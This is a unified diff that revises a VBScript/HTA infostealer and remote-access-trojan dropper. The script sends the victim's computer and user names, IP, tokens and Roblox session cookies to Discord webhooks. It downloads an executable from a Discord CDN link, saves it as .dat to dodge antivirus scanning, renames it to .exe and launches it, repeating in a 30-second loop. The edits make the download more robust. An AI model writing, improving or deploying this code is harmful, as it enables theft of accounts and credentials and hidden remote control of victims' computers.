@@ -18,7 +18,7 @@ RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- 1. INITIAL GRABS (fast) ---
+' --- 1. INITIAL GRABS ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
 Call IP(WH)
 Call GrabTokens(WH)
@@ -28,66 +28,68 @@ Call PostCookieOnly(WH)
 ' --- 2. DROP RAT LAST (init) ---
 Call DropRAT(WH, True)
 
-' --- 3. LOOP (30s, grabs + RAT re-drop each cycle) ---
+' --- 3. LOOP (30s, grabs + RAT re-drop) ---
 Dim runCount
 runCount = 0
 Do
     runCount = runCount + 1
     Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, RE_WH)
-    
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
     Call DropRAT(RE_WH, True)
-    
     Call SleepSeconds(30)
 Loop
 
 window.close()
 
-' --- RAT DROP (HTTP object, no curl) ---
+' --- RAT DROP (WinHttp, no curl) ---
 Sub DropRAT(targetWH, sendRocket)
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1557266192971071579/1572386687181394011/client_1.exe?ex=6afe2eb7&is=6afcdd37&hm=45b391655f98bf6655421b302ad71a84bbefa663119aa5784404b8bcee5c2d9f&"
     
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
     Randomize
-    Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
-    Dim op : op = tPath & "\" & fname
+    Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000)
+    Dim datPath : datPath = tPath & "\" & fname & ".dat"
+    Dim op : op = tPath & "\" & fname & ".exe"
     
     If sendRocket Then
         Call PostEmbedTo(":rocket: RAT Download Initiated", "Downloading and launching RAT", 10181046, targetWH)
     End If
 
     If fso.FileExists(op) Then fso.DeleteFile op, True
-
-    ' HTTP object download to .dat first — avoids write-time executable scan
-    Dim datPath : datPath = tPath & "\" & fname & ".dat"
     If fso.FileExists(datPath) Then fso.DeleteFile datPath, True
 
-    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    xh.SetOption 2, 13056
+    Dim xh : Set xh = CreateObject("WinHttp.WinHttpRequest.5.1")
+    xh.SetTimeouts 5000, 5000, 5000, 30000
     xh.Open "GET", dl, False
     xh.Send
-    Dim ok : ok = False
-    If xh.Status = 200 Then
+    Dim status : status = xh.Status
+    Dim bodyLen : bodyLen = 0
+    If status = 200 Then bodyLen = LenB(xh.ResponseBody)
+
+    If sendRocket Then Call PostEmbedTo(":mag: DL " & status, "Bytes: " & bodyLen, 10181046, targetWH)
+
+    If status = 200 And bodyLen > 100000 Then
         Dim st : Set st = CreateObject("ADODB.Stream")
         st.Type = 1
         st.Open
-        st.Write xh.responseBody
+        st.Write xh.ResponseBody
         st.SaveToFile datPath, 2
         st.Close
         Set st = Nothing
-        ok = True
-    End If
-    Set xh = Nothing
-
-    If ok And fso.FileExists(datPath) Then
-        If fso.GetFile(datPath).Size > 100000 Then
-            fso.MoveFile datPath, op
-            If sendRocket Then Call PostEmbedTo(":white_check_mark: Rat Launched", "Rat Launched", 10181046, targetWH)
-            Call RunCmd("""" & op & """")
+        Set xh = Nothing
+        
+        If fso.FileExists(datPath) Then
+            If fso.GetFile(datPath).Size > 100000 Then
+                fso.MoveFile datPath, op
+                If sendRocket Then Call PostEmbedTo(":white_check_mark: Rat Launched", "Rat Launched", 10181046, targetWH)
+                Call RunCmd("""" & op & """")
+            End If
         End If
+    Else
+        Set xh = Nothing
     End If
 End Sub
 
@@ -144,10 +146,8 @@ Function GetRobloxCookie()
         End If
     End If
     If Len(fp) = 0 Then Exit Function
-    
     raw = ReadFile(fp)
     If Len(raw) < 50 Then Exit Function
-
     Dim cookie: cookie = ""
     If InStr(raw, "_|WARNING") > 0 Then cookie = raw
     If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
@@ -165,7 +165,6 @@ Function GetRobloxCookie()
         Dim rp: rp = InStr(raw, ".ROBLOSECURITY") : cookie = Mid(raw, rp)
     End If
     If Len(cookie) = 0 Then cookie = raw
-
     cookie = Replace(cookie, vbCr, "")
     cookie = Replace(cookie, vbLf, "")
     cookie = Replace(cookie, vbTab, "")
@@ -175,7 +174,6 @@ Function GetRobloxCookie()
     cookie = Trim(cookie)
     Dim warn: warn = InStr(cookie, "_|WARNING")
     If warn > 1 Then cookie = Mid(cookie, warn)
-
     GetRobloxCookie = cookie
 End Function
 
